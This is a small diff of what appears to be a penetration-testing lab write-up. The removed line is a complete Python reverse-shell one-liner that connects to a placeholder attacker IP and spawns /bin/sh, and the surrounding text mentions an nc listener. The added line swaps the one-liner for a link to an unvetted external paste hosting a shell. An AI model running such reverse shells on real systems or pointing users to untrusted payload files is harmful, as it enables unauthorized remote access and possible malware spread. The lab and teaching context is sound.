@@ -57,7 +57,7 @@ Now we need to get a reverse shell. To do this, we can test if machine has pytho
 
 We have python3. Lets copy our reverse shell cheat sheet at  https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
 
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_OPENVPN_IP>",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+here u can find it easily : https://up10.me/N/shell.txt
 
 Before we execute this script we have to start a nc listener.
 
